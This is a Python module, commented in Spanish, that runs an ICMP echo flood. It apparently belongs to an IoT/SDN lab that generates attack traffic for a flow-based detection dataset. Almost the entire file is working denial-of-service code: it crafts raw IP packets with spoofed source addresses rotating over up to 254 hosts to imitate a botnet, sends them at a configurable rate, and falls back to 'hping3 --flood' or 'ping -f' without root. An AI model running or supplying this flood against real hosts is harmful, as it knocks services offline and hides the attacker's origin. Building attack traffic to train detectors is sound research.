"""ICMP echo flood.

ICMP no tiene puertos, así que el flow_extractor sólo puede separar flujos por
IP origen. Con root usamos raw socket con source IPs spoofed rotando sobre un
rango (imita una botnet distribuida) → N flujos ICMP_FLOOD distintos. Sin root,
fallback a hping3 o ping (un solo flujo, menos muestras).
"""

from __future__ import annotations

import shutil
import socket
import struct
import subprocess
import time

N_SRC = 256


def run(cfg: dict) -> int:
    target_ip = cfg["target_ip"]
    duration = cfg["duration_s"]
    rate = cfg.get("rate_pps", 10000)
    spoof_base = cfg.get("spoof_base_ip", "10.10.1.100")
    if _raw_flood(target_ip, spoof_base, int(cfg.get("src_hosts", N_SRC)), duration, rate):
        return 0

    # fallback sin root: hping3 o ping (single-flow)
    if shutil.which("hping3"):
        proc = subprocess.Popen(
            ["hping3", "--flood", "--icmp", target_ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    else:
        proc = subprocess.Popen(
            ["ping", "-f", target_ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    time.sleep(duration)
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    return 0


def _raw_flood(target_ip: str, spoof_base: str, n_src: int, duration: int, rate: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError:
        return False

    sources = _src_pool(spoof_base, n_src)
    period = 1.0 / max(rate, 1.0)
    end = time.time() + duration
    ns, i = len(sources), 0
    icmp = _icmp_echo()
    while time.time() < end:
        src = sources[i % ns]
        i += 1
        pkt = _ip(src, target_ip, len(icmp)) + icmp
        try:
            sock.sendto(pkt, (target_ip, 0))
        except OSError:
            pass
        time.sleep(period)
    sock.close()
    return True


def _src_pool(base_ip: str, n: int) -> list[str]:
    a, b, c, d = base_ip.split(".")
    start = int(d)
    return [f"{a}.{b}.{c}.{(start + k) % 254 + 1}" for k in range(min(n, 254))]


def _icmp_echo() -> bytes:
    header = struct.pack("!BBHHH", 8, 0, 0, 0x1337, 1)
    payload = b"iotsdn-icmp-flood"
    chk = _checksum(header + payload)
    return struct.pack("!BBHHH", 8, 0, chk, 0x1337, 1) + payload


def _ip(src: str, dst: str, payload_len: int) -> bytes:
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + payload_len, 1, 0, 64, socket.IPPROTO_ICMP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF
